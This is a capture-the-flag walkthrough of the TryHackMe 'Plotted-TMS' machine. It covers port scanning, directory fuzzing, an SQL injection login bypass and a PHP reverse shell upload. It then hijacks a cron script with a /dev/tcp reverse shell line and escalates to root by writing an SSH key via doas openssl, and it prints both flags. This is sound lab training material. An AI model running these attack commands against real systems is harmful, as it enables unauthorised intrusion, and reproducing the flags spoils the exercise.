---
created: 21-01-2026
---
- Challenge: [`Plotted-TMS`](https://tryhackme.com/room/plottedtms)
- Difficulty: Easy

## Initial access

- The first step is to scan ports on the target machine:

```bash
sudo nmap 10.65.152.50
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 06:27 UTC
Nmap scan report for 10.65.152.50
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

- A more thorough scan:

```bash
sudo nmap 10.65.152.50 -p22,80,445 -sV -sC
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 06:51 UTC
Nmap scan report for 10.65.152.50
Host is up (0.18s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.30 seconds
```


- We see an Apache server running on port `80`. It's a good idea to enumerate files and directories it exposes:

```bash
ffuf -w ./Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.65.152.50/FUZZ -c -ic -recursion -s
```
```bash
admin
Adding a new job to the queue: http://10.65.152.50/admin/FUZZ
shadow
passwd
```

- We catch two entries with Base64-encoded content: `passwd` and `shadow`:

```bash
curl -s http://10.65.152.50/passwd | base64 -d
not this easy :D
```

```bash
curl -s http://10.65.152.50/shadow | base64 -d
not this easy :D
```

Yeah, expected.

- There's a directory, `admin`. And although the status code is `301`, the server responds with a directory listing (always take status codes with a grain of salt!). There you find an `id_rsa` file:

```bash
curl -s http://10.65.152.50/admin/id_rsa | base64 -d
Trust me it is not this easy..now get back to enumeration :D
```

- On port `445`, there's Apache running as well (though `445` is standard for SMB):

```bash
ffuf -w ./Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.65.152.50:445/FUZZ -c -ic -recursion
```
```bash

management
```

- At `http://10.65.152.50:445/management/`, we see a normal PHP web application:


![[445.png]]

- We then find a login page at `managemnet/admin/login.php`:

![[failed_login.png]]

Instead of blindly brute-forcing, let's try testing for basic vulnerabilities first, such as SQL injection.
It turns out that it's possible to log in with the username `admin' OR 1=1 -- -` and an arbitrary password.

![[admin_access.png]]

- We can achieve RCE by uploading and navigating to a [PHP reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) in a user avatar upload functionality:

```bash
nc -lvnp 1337
```

```bash
listening on [any] 1337 ...
connect to [192.168.148.230] from (UNKNOWN) [10.65.152.50] 47896
Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:12:21 up  1:52,  0 users,  load average: 0.03, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

- Get a normal interactive shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
^Z
```

```bash
stty raw -echo && fg
```
## Privilege escalation

- `/etc/crontab`:

```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * *	plot_admin /var/www/scripts/backup.sh
#
```

- The script `/var/www/scripts/backup.sh` runs every minute as `plot_admin`:

```bash
ls -la /var/www/scripts
```

```bash
total 12
drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
```

- The script is located in the directory **owned by your current user**, but the script itself is owned by `plot_admin`. **There is no sticky bit on it**, so you can simply delete it and recreate with the same name. Whatever you put inside will be executed as a Cron job:

```bash
rm /var/www/scripts/backup.sh
```
```bash
rm: remove write-protected regular file '/var/www/scripts/backup.sh'? y
```

```bash
echo << EOF > /var/www/scripts/backup.sh
#!/bin/bash
0<&196;exec 196<>/dev/tcp/192.168.148.230/1338; sh <&196 >&196 2>&196
echo /tmp/done
EOF
```

```bash
chmod +x /var/www/scripts/backup.sh
```

- Set up another listener and wait for the shell:

```bash 
nc -lnvp 1338
```

```bash
nc -lvnp 1338
listening on [any] 1338 ...
connect to [192.168.148.230] from (UNKNOWN) [10.66.169.195] 48444
whoami
plot_admin
```


- Get a normal interactive shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
^Z
```

```bash
stty raw -echo && fg
```


- Get the first flag:

```bash
cat user.txt
```

```
77927510d5edacea1f9e86602f1fbadb
```


## Privilege escalation to root


```bash
cat /etc/doas.conf
```
```
permit nopass plot_admin as root cmd openssl
```

- On your machine, generate SSH keys:

```bash
ssh-keygen -t rsa
```

```bash
Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): id_rsa
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:TBdCgSv30NuK/srXZnLKKHbUINZeG42eY7Jdcv1nSO4 user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|       o+..      |
|      .  . .     |
|     . o.o.      |
|    + *o=..      |
|   . = BS* .     |
|      + @ + . .  |
|     . * B   + . |
|    o.+o= =   + o|
|   . +=++*   .Eo |
+----[SHA256]-----+
```

- [`openssh`](https://gtfobins.org/gtfobins/openssl) as root allows you to write arbitrary file. Copy contents of the `id_rsa.pub` file and paste it into `/root/.ssh/authorized_keys`:

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsTbv7/6J4OPKPBf1JCJzk0z0Ay8xRl3cScO+lcBIB7DjphyLBsclEokuBOjNBXM4Mt/TwhKcNOGFKdC7i6I/kgSsJTAUxICEmFqS7D5Y6RcnPVc+Sx9koSLnrdNayfXB1VH6pmBQ89Y2atGoxq7KDmT5fES/ubo4yjahkRqPd17WVthz/1yNS2wJvglv9/qmmNUNnfnPecTlWnZXvBZE6nd/FQj1RbqBx5IXwHa0gymRY9OtyHZS/ZIDgD1+S9LetskgKA08lIK0XRatiHaYWRC69J8IYN1q1LR7nmtavEYDAm5slzwACHpSwa/+5dwTBjpcvA4qeHuIuO+UfiSp4X9n3g8QtgtUPyDFOMQQ4iX6o4wp6YEcpqdPLIkpuZNtetYk/Mq6UiH3IzUxDOif7VB0A9g8chRDJ6LkR3R23aqVaTuUISnBGt7rOshQHWu+hdVOs1Jj1g5BPQ4zCXuvEAOLa3fZj1bVxgZX6HhqQBDxHRkKLbAfBUseGU5MOl90= user@parrot' | doas openssl enc -out /root/.ssh/authorized_keys
```

- Then simply SSH into the target machine as root using your private key, `id_rsa`:

```bash
ssh root@10.66.169.195 -i id_rsa
```

```
The authenticity of host '10.66.169.195 (10.66.169.195)' can't be established.
ED25519 key fingerprint is SHA256:u+cHshV6MKleRbSWX34rMxAM6XuCoZ5ChS98cTrnPns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.66.169.195' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

# ...

root@plotted:~# whoami
root
root@plotted:~# 
```

- Get the flag:

```bash
cat root.txt
Congratulations on completing this room!

53f85e2da3e874426fa059040a9bdcab

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

